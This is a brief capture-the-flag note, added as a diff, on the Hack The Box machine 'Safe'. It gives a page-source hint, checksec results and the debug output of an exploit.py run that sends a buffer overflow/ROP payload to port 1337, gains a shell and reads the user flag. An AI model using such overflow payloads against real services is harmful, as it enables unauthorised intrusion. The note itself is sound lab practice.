@@ -1,0 +1,40 @@
+
+found this at apache default page source
+<!-- 'myapp' can be downloaded to analyze from here
+     its running on port 1337 -->
+
+
+goto http://safe.htb/myapp
+
+
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+
+root@kali:~/HTB/Safe# python exploit.py
+[+] Opening connection to 10.10.10.147 on port 1337: Done
+[DEBUG] Received 0x3d bytes:
+    ' 10:49:22 up  2:45,  1 user,  load average: 0.27, 0.29, 0.21\n'
+[DEBUG] Sent 0xa8 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000070  41 41 41 41  41 41 41 41  0b 12 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
+    00000080  00 40 40 00  00 00 00 00  60 10 40 00  00 00 00 00  │·@@·│····│`·@·│····│
+    00000090  0b 12 40 00  00 00 00 00  00 40 40 00  00 00 00 00  │··@·│····│·@@·│····│
+    000000a0  40 10 40 00  00 00 00 00                            │@·@·│····││
+    000000a8
+[DEBUG] Sent 0x1 bytes:
+    '\n' * 0x1
+[*] Switching to interactive mode
+$ cat /home/user/user.txt
+[DEBUG] Sent 0x18 bytes:
+    'cat /home/user/user.txt\n'
+[DEBUG] Received 0x21 bytes:
+    '7a29ee9b0fa17ac013d4bf01fd127690\n'
+7a29ee9b0fa17ac013d4bf01fd127690
+[*] Got EOF while reading in interactive
+$  
+
